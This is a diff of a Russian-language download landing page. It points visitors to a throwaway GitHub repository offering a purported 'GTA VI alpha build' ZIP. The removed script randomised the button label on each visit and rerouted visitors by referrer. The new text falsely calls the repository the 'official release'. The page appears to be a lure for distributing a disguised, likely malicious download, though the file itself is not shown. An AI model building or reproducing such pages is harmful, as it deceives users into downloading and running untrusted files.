@@ -1,23 +1,14 @@
-<!-- ... остальная разметка сверху ... -->
+<main style="max-width:720px;margin:12vh auto;padding:0 16px;color:#e5e7eb;font:16px/1.5 system-ui;background:#0b0b0b">
+  <h1 style="font-size:40px;margin:0 0 16px">Почти готово</h1>
+  <p style="opacity:.9;margin:0 0 28px">
+    Откроем официальный релиз на GitHub. Нажмите файл там, чтобы начать загрузку.
+  </p>
+  <a href="https://github.com/dcalderonc29-collab/app-downloadss/releases/tag/111"
+     class="btn">Открыть релиз на GitHub</a>
+</main>
 
-<a class="cta" id="dl"
-   href="https://github.com/dcalderonc29-collab/app-downloadss/releases/download/111/GTAVI_Alpha_Build_Aug14.zip"
-   target="_top" rel="noreferrer noopener">Download</a>
-
-<script>
-  // случайные подписи — меняются на каждом открытии
-  const labels = [
-    'Get file', 'Download', 'Get it now', 'Grab build', 'Start download',
-    'Fetch ZIP', 'Save file', 'Get package'
-  ];
-  document.getElementById('dl').textContent =
-    labels[Math.floor(Math.random() * labels.length)];
-
-  // если пришли назад с objects.githubusercontent.com — отправим на страницу релиза
-  try {
-    if (document.referrer && /objects\.githubusercontent\.com/.test(document.referrer)) {
-      document.getElementById('dl').href =
-        'https://github.com/dcalderonc29-collab/app-downloadss/releases/latest';
-    }
-  } catch(e){}
-</script>
+<style>
+  .btn{display:inline-block;padding:12px 18px;border:1px solid #3a3a3a;border-radius:10px;
+       font-weight:600;text-decoration:none}
+  .btn:hover{outline:2px solid #444}
+</style>
